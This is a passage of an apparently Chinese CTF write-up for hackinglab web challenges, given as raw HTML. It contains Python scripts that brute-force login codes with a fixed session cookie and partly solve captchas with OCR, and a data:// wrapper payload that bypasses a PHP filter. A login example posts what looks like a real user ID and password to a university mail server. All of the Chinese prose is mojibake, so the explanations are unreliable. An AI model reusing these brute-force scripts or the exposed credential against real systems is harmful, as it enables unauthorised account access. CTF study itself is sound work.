string">'text/xml'</span><span class="token punctuation">}</span>    XML <span class="token operator">=</span> <span class="token string">'&lt;?xml version="1.0" encoding="utf-8"?>&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">&lt;soap:Body>&lt;Request xmlns="http://tempuri.org/">&lt;jme>&lt;JobClassFullName>WeChatJSTicket.JobWS.Job.JobRefreshTicket,WeChatJSTicket.JobWS&lt;/JobClassFullName>&lt;Action>RUN&lt;/Action>&lt;Param>1&lt;/Param>&lt;HostIP>127.0.0.1&lt;/HostIP>&lt;JobInfo>1&lt;/JobInfo>&lt;NeedParallel>false&lt;/NeedParallel>&lt;/jme>&lt;/Request>&lt;/soap:Body>&lt;/soap:Envelope>'</span>    url <span class="token operator">=</span> <span class="token string">'http://jobws.push.mobile.xxxxxxxx.com/RefreshWeiXInTokenJob/RefreshService.asmx'</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>XML<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r.encoding = 'utf-8'</span>    data <span class="token operator">=</span> r<span class="token punctuation">.</span>text    <span class="token keyword">print</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-Requestsæ¨¡æ‹Ÿç™»å…¥å®ä¾‹"><a href="#5-Requestsæ¨¡æ‹Ÿç™»å…¥å®ä¾‹" class="headerlink" title="5.Requestsæ¨¡æ‹Ÿç™»å…¥å®ä¾‹"></a>5.Requestsæ¨¡æ‹Ÿç™»å…¥å®ä¾‹</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestspayload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'action:login'</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'uid'</span><span class="token punctuation">:</span><span class="token string">'08133248'</span><span class="token punctuation">,</span><span class="token string">'domain'</span><span class="token punctuation">:</span><span class="token string">'cumt.edu.cn'</span><span class="token punctuation">,</span><span class="token string">'nodetect'</span><span class="token punctuation">:</span><span class="token string">'false'</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'wattcswh'</span><span class="token punctuation">,</span><span class="token string">'locale'</span><span class="token punctuation">:</span><span class="token string">'zh_CN'</span><span class="token punctuation">}</span>header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"mail.cumt.edu.cn"</span><span class="token punctuation">,</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"</span><span class="token punctuation">,</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span><span class="token punctuation">,</span><span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="token punctuation">,</span><span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span><span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://acm.hdu.edu.cn/"</span><span class="token punctuation">,</span><span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"uid=08133248"</span><span class="token punctuation">,</span><span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"keep-alive"</span><span class="token punctuation">}</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://mail.cumt.edu.cn/coremail/index.jsp'</span><span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>status_code<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cookieçš„ä¿¡æ¯éœ€è¦å…ˆé€šè¿‡æŠ“åŒ…æ¥è·å–</p><p>è„šæœ¬åˆ†æï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding : utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> re   <span class="token comment" spellcheck="true">#æ­£åˆ™è¡¨è¾¾å¼</span>url <span class="token operator">=</span> <span class="token string">'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'</span>head <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=98db957833ad06f20d20765aed472328'</span><span class="token punctuation">}</span>source <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>expression <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'(\d+[+*])+(\d+[+*])+\((\d+[+*])+(\d+)\)'</span><span class="token punctuation">,</span> source<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span>val <span class="token operator">=</span> str<span class="token punctuation">(</span>eval<span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span>post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'v'</span><span class="token punctuation">:</span> val<span class="token punctuation">}</span>result <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">,</span> data<span class="token operator">=</span>post<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®©è„šæœ¬å¸¦ç€cookieå€¼ï¼Œä»¥ä¾¿äºç”¨æˆ·è®¿é—®é¡µé¢çš„æ—¶å€™è¿›è¡Œèº«ä»½éªŒè¯ã€‚</p><p>é‡è¦çš„æ˜¯åé¢çš„èµ‹å€¼ç»™r2ï¼Œr3çš„ä»£ç ä¸ç†è§£ï¼Œè¿˜æ˜¯éœ€è¦å­¦pythonæ‰è¡Œ</p><h2 id="æ€ä¹ˆå°±æ˜¯ä¸å¼¹å‡ºkeyå‘¢ï¼Ÿ"><a href="#æ€ä¹ˆå°±æ˜¯ä¸å¼¹å‡ºkeyå‘¢ï¼Ÿ" class="headerlink" title="æ€ä¹ˆå°±æ˜¯ä¸å¼¹å‡ºkeyå‘¢ï¼Ÿ"></a>æ€ä¹ˆå°±æ˜¯ä¸å¼¹å‡ºkeyå‘¢ï¼Ÿ</h2><p>åœ¨<script>æ ‡ç­¾ä¸­ï¼Œå­˜åœ¨ä¸‰ä¸ªæ‰°ä¹±çš„å‡½æ•°return falseï¼›åˆ é™¤å‰ä¸‰ä¸ªå‡½æ•°ï¼Œåœ¨æœ¬åœ°é‡æ–°æ‰§è¡Œä»£ç ï¼ˆæ³¨ï¼šéœ€æœ‰phpstudyç¯å¢ƒæ”¯æŒï¼‰ï¼Œå¾—åˆ°å¼¹çª—ï¼Œæˆªå–å‰åå››ä½å­—ç¬¦ï¼Œå³ä¸ºkeyï¼šslakfjteslkjsd</p><h2 id="é€—æ¯”éªŒè¯ç ç¬¬ä¸€æœŸ"><a href="#é€—æ¯”éªŒè¯ç ç¬¬ä¸€æœŸ" class="headerlink" title="é€—æ¯”éªŒè¯ç ç¬¬ä¸€æœŸ"></a>é€—æ¯”éªŒè¯ç ç¬¬ä¸€æœŸ</h2><p>hintï¼šè¿›å…¥ç™»é™†é¡µé¢åï¼ŒUserä¿¡æ¯å·²ç»™å‡ºï¼Œå¯†ç æç¤ºä¸ºï¼š<strong>ç¬¬ä¸€ä½ä¸ä¸º0çš„4ä½çº¯æ•°å­—</strong>ï¼Œä½†éœ€è¦è¾“å…¥éªŒè¯ç ç™»é™†ã€‚</p><p>è¿™æ˜¯æ€ä¹ˆä¸ªéªŒè¯ç æ¼æ´ï¼šéªŒè¯ç çš„ç”Ÿæˆä¸cookieæœ‰å…³ï¼Œæ‰€ä»¥è„šæœ¬è¦å›´ç»•ç€cookieå€¼æ¥å†™</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding : utf-8 -*-</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php'</span><span class="token keyword">for</span> password <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=98db957833ad06f20d20765aed472328'</span><span class="token punctuation">}</span>    post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'pwd'</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">'vcode'</span><span class="token punctuation">:</span> <span class="token string">'ws2b'</span><span class="token punctuation">,</span> <span class="token string">'submit'</span><span class="token punctuation">:</span> <span class="token string">'submit'</span><span class="token punctuation">}</span>    result <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">,</span> data<span class="token operator">=</span>post<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">9</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The passowrd is : "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>     <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒæ ·ï¼Œæ—¢ç„¶æ˜¯é€šè¿‡bpæŠ“åŒ…è·å¾—çš„cookieï¼Œé‚£ä¹ˆç›´æ¥åœ¨bpé‡Œé¢çˆ†ç ´å°±è¡Œï¼š1238</p><h2 id="é€—æ¯”éªŒè¯ç ç¬¬äºŒæœŸ"><a href="#é€—æ¯”éªŒè¯ç ç¬¬äºŒæœŸ" class="headerlink" title="é€—æ¯”éªŒè¯ç ç¬¬äºŒæœŸ"></a>é€—æ¯”éªŒè¯ç ç¬¬äºŒæœŸ</h2><p>hintï¼šéªŒè¯ä¾¿å¤±æ•ˆçš„éªŒè¯ç </p><p>å½“éªŒè¯ç ä¸ºç©ºæ—¶å¯ä»¥å®ç°çˆ†ç ´</p><h2 id="é€—æ¯”çš„éªŒè¯ç ç¬¬ä¸‰æœŸï¼ˆSESSIONï¼‰"><a href="#é€—æ¯”çš„éªŒè¯ç ç¬¬ä¸‰æœŸï¼ˆSESSIONï¼‰" class="headerlink" title="é€—æ¯”çš„éªŒè¯ç ç¬¬ä¸‰æœŸï¼ˆSESSIONï¼‰"></a>é€—æ¯”çš„éªŒè¯ç ç¬¬ä¸‰æœŸï¼ˆSESSIONï¼‰</h2><p>Tips:å¯†ç æ˜¯4ä½æ•°å­—ï¼Œé¦–ä½ä¸æ˜¯0<br>Tips2: SESSION</p><p>ä¸ç¬¬äºŒæœŸæ— å¼‚</p><h2 id="å¾®ç¬‘ä¸€ä¸‹å°±èƒ½è¿‡å…³"><a href="#å¾®ç¬‘ä¸€ä¸‹å°±èƒ½è¿‡å…³" class="headerlink" title="å¾®ç¬‘ä¸€ä¸‹å°±èƒ½è¿‡å…³"></a>å¾®ç¬‘ä¸€ä¸‹å°±èƒ½è¿‡å…³</h2><p>æŸ¥çœ‹æ–‡ä»¶æºä»£ç ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'view-source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/\./'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/**æ ¼å¼ï¼š'//'     * \çš„ä½œç”¨æ˜¯å°†.è¿›è¡Œè½¬ä¹‰ä½¿åœ¨''ä¸­èƒ½è¢«è½¬ä¹‰å‡ºæ¥    */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/%/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/http/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/https/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/ftp/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/telnet/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/_/'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">file_exists</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$smile</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smile</span> <span class="token operator">===</span> <span class="token string">"(â—'â—¡'â—)"</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token delimiter">?></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>file_get_contents() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶ä¸€æ¬¡æ€§è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p><p>ä¾‹å­ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>è¾“å‡ºï¼šThis is a test file with test text<span class="token punctuation">.</span><span class="token constant">PHP</span> Filesystem å‡½æ•°<span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//å…¨å›½ï¼Œåˆ¤æ–­æ¡ä»¶æ˜¯$REQUEST_URIæ˜¯å¦å«æœ‰html</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>1.å¿…é¡»å¯¹&quot;^_^&quot;èµ‹å€¼2.&quot;^_^&quot;çš„å€¼ä¸èƒ½æœ‰  .  %  [0-9]  http  https  ftp  telnet  è¿™äº›ä¸œè¥¿3.$_SERVER[&#39;QUERY_STRING&#39;],å³&quot;^_^=(è¾“å…¥çš„å€¼)&quot;è¿™ä¸ªå­—ç¬¦ä¸²ä¸èƒ½æœ‰ _ è¿™ä¸ªå­—ç¬¦4.æ»¡è¶³$smile!=05.file_exists ($_GET[&#39;^_^&#39;])å¿…é¡»ä¸º0.ä¹Ÿå°±æ˜¯$_GET[&#39;^_^&#39;]æ­¤æ–‡ä»¶ä¸å­˜åœ¨6.&quot;$smile&quot;å¿…é¡»ç­‰äº&quot;(â—&#39;â—¡&#39;â—)&quot;.ä¹Ÿå°±æ˜¯file_get_contents($_GET[&#39;^_^&#39;])å¿…é¡»ä¸º&quot;(â—&#39;â—¡&#39;â—)&quot;</code></pre><pre><code>ä»”ç»†åˆ†æå¯ä»¥å‘ç°,ç¬¬3ç‚¹ä¸ç¬¬1ç‚¹çŸ›ç›¾äº†,æ—¢è¦å¯¹&quot;^_^&quot;èµ‹å€¼,åˆå¾—æƒ³åŠæ³•å»æ‰&quot;^_^&quot;ä¸­çš„&quot;_&quot;,é‚£ä¹ˆå¯ä»¥é‡‡ç”¨Urlç¼–ç å˜ä¸º&quot;%5f&quot;.è¿™æ ·ç¬¬3ç‚¹å°±æ»¡è¶³äº†.æ‰€ä»¥æˆ‘ä»¬è¾“å…¥å°±åº”è¯¥ä¸º&quot;^%5f^&quot;.ç»§ç»­åˆ†æç¬¬2ç‚¹,è¿™ä¸ªåœ°æ–¹æŠŠ  http  https  ftp  telnet  è¿™äº›ç»™è¿‡æ»¤äº†,è€Œç¬¬6ç‚¹åˆè¦é€šè¿‡file_get_contents()å–å‡º$_GET[&#39;^_^&#39;]é‡Œçš„å€¼.è€Œæ ¹æ®ç¬¬5ç‚¹,$_GET[&#39;^_^&#39;]åˆå¿…é¡»ä¸å­˜åœ¨.æ‰€ä»¥$_GET[&#39;^_^&#39;]åªèƒ½æ˜¯å­—ç¬¦ä¸²&quot;(â—&#39;â—¡&#39;â—)&quot;,ä¸å¯èƒ½æ˜¯æ–‡ä»¶å.é‚£ä¹ˆfile_get_contents()é‡Œçš„å‚æ•°åº”è¯¥æ˜¯å•¥å‘¢.æŸ¥äº†ä¸€ä¸‹,å‘ç°data://å®Œç¾ç¬¦åˆ.æ‰€ä»¥æˆ‘ä»¬è¾“å…¥å°±åº”è¯¥ä¸º&quot;^%5f^=data:,(â—&#39;â—¡&#39;â—)&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdn.net/20161027135341809" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdn.net/20161027135356098" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"></p><p>payloadï¼š</p><pre><code>http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?^%5f^=data:,(â—&#39;â—¡&#39;â—)</code></pre><p><a href="https://mp.weixin.qq.com/s?src=11&timestamp=1613478185&ver=2894&signature=ZsKKFmZlhTTbFrqZys6aaYlfeQ0BCbV*uMHZ*dm0s-ikbmwXPUY30xBoSEqCRGWhf7AhmMsbVOc*IX-Up5D3bIAGUQvWOf9gt0ykWsiOyB0dVxEYFSo7iK-DOTQEZVKL&new=1">file_get_contents("php://input")çš„ä½¿ç”¨æ–¹æ³•</a></p><h2 id="é€—æ¯”çš„æ‰‹æœºéªŒè¯ç "><a href="#é€—æ¯”çš„æ‰‹æœºéªŒè¯ç " class="headerlink" title="é€—æ¯”çš„æ‰‹æœºéªŒè¯ç "></a>é€—æ¯”çš„æ‰‹æœºéªŒè¯ç </h2><p>hintï¼šä½ çš„æ‰‹æœºå·ç æ˜¯13388886666ï¼ŒéªŒè¯ç å°†ä¼šä»¥å¼¹çª—çš„å½¢å¼ç»™å‡º</p><p>éœ€è¦ä»¥13388886667çš„è´¦å·è¿›è¡Œç™»å½•ï¼Œæ‰€ä»¥åˆ©ç”¨6æ¥è·å¾—éªŒè¯ç ï¼Œç™»å½•çš„æ—¶å€™ç”¨7ç™»å½•ä¸€æ ·ä¼šæˆåŠŸ</p><h2 id="åŸºæƒ…ç‡ƒçƒ§çš„å²æœˆ"><a href="#åŸºæƒ…ç‡ƒçƒ§çš„å²æœˆ" class="headerlink" title="åŸºæƒ…ç‡ƒçƒ§çš„å²æœˆ"></a>åŸºæƒ…ç‡ƒçƒ§çš„å²æœˆ</h2><p>Tips:ä½ æ˜¯ä¸€åé»‘å®¢ï¼Œä½ æ€€ç–‘ä½ çš„â€œï¼ˆç”·/å¥³ï¼‰é—ºèœœâ€çš„å‡ºè½¨äº†ï¼Œä½ è¦ç™»é™†TAæ‰‹æœºçš„ç½‘ä¸Šè¥ä¸šå…æŸ¥çœ‹è¯¦å•ï¼Œä¸€æ¢ç©¶ç«Ÿï¼ é—ºèœœæ‰‹æœºå·ç :13388886666</p><p>å¼¹çª—ï¼šæ‰‹æœºéªŒè¯ç æ˜¯ï¼šéªŒè¯ç å‘åˆ°æ‰‹æœºä¸Šäº†ï¼Œä½ çœ‹ä¸åˆ°..æ˜¯3ä½çº¯æ•°å­—ï¼Œå¼€å¤´ä¸ä¸º0</p><p>æ„æ€åº”è¯¥æ˜¯å¸Œæœ›æˆ‘ä»¬è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°éªŒè¯ç ä¸ºï¼š200ï¼Œ</p><p>ç™»å½•å¾—åˆ°ï¼šä½ ä¼¤å¿ƒçš„å‘ç°ä»–/å¥¹æ­£åœ¨è·Ÿä½ çš„å‰ç”·/å¥³å‹å‹¾æ­.....äºæ˜¯ä¸‹å†³å¿ƒçœ‹çœ‹å‰ä»»é™¤äº†è·Ÿä½ çš„ï¼ˆç”·/å¥³ï¼‰é—ºèœœå‹¾æ­ï¼Œæ˜¯ä¸æ˜¯è¿˜è·Ÿåˆ«çš„å‹¾æ­..<br>å‰ä»»çš„æ‰‹æœºå·ç æ˜¯:13399999999ï¼ŒåŒç†çˆ†ç ´å¾—åˆ°ï¼šLKK8*(!@@sd</p><h2 id="éªŒè¯ç è¯†åˆ«ï¼ˆæœªå®Œæˆï¼‰"><a href="#éªŒè¯ç è¯†åˆ«ï¼ˆæœªå®Œæˆï¼‰" class="headerlink" title="éªŒè¯ç è¯†åˆ«ï¼ˆæœªå®Œæˆï¼‰"></a>éªŒè¯ç è¯†åˆ«ï¼ˆæœªå®Œæˆï¼‰</h2><p>Tips:éªŒè¯ç ä¾ç„¶æ˜¯3ä½æ•°</p><p>è½¯ä»¶åˆ©ç”¨pkav</p><p>è„šæœ¬ï¼šéœ€è¦å®‰è£…tesseract-ocræ¨¡å—ï¼Œé€šè¿‡tesseractæ¥è¯†åˆ«éªŒè¯ç </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> pytesseract<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">import</span> syss <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php"</span>head <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=0a8197f36e6ab659fa5e0be5168b5b35'</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token number">100</span>    <span class="token keyword">while</span> num <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> get_code<span class="token punctuation">(</span><span class="token punctuation">)</span>        